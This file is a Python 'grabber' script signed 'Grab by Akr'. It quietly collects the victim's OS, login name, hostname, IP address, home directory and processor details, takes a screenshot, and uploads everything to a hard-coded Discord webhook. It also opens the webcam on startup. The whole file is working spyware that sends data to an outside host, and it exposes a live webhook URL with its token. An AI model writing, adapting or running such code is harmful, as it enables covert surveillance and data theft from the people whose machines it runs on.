import os
import time
import socket
import platform
import requests
import pyautogui
import pyfiglet
from PIL import Image
import psutil
import cv2

cap = cv2.VideoCapture(0)

WEBHOOK_URL = "https://discord.com/api/webhooks/1311015529875640380/SRcH0uuSO7pQVHukyDSUqm1XnVMLcjKICwyBjJFz-8pYjhE9c09ipq9Fq-Hj-lEWhkDD"

def grab_info():
    system_platform = platform.system()
    path = os.path.expanduser('~')
    login1 = os.getlogin()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return {
        "Platform": system_platform,
        "User Login": login1,
        "Hostname": hostname,
        "IP Address": ip_address,
        "Home Directory": path
    }

def get_system_info():
    uname_info = platform.uname()
    return {
        "System Version": uname_info.version,
        "Architecture": uname_info.machine,
        "Processor": uname_info.processor
    }


def capture_screenshot(filename="screenshot.png"):
    print(pyfiglet.figlet_format("Grab by Akr"))
    time.sleep(1)
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    return filename

def send_to_discord_webhook(image_path, video_path, webhook_url):
    system_info = grab_info()
    advanced_system_info = get_system_info()

    embed = {
        "embeds": [
            {
                "title": "PC Information",
                "color": 800000,  
                "fields": [
                    {"name": "Platform", "value": system_info["Platform"], "inline": True},
                    {"name": "User Login", "value": system_info["User Login"], "inline": True},
                    {"name": "Hostname", "value": system_info["Hostname"], "inline": True},
                    {"name": "IP Address", "value": system_info["IP Address"], "inline": True},
                    {"name": "Home Directory", "value": system_info["Home Directory"], "inline": True},
                    {"name": "System Version", "value": advanced_system_info["System Version"], "inline": True},
                    {"name": "Architecture", "value": advanced_system_info["Architecture"], "inline": True},
                    {"name": "Processor", "value": advanced_system_info["Processor"], "inline": True},
                ]
            }
        ]
    }

    try:
        response = requests.post(webhook_url, json=embed)
        response.raise_for_status() 
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi de l'embed : {e}")

    try:
        with open(image_path, "rb") as file:
            files = {'file': (os.path.basename(image_path), file, 'image/png')}
            response = requests.post(webhook_url, files=files)
            response.raise_for_status()  
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi de l'image : {e}")

if __name__ == "__main__":
    screenshot_path = capture_screenshot("screenshot.png")
    send_to_discord_webhook(screenshot_path, None, WEBHOOK_URL)
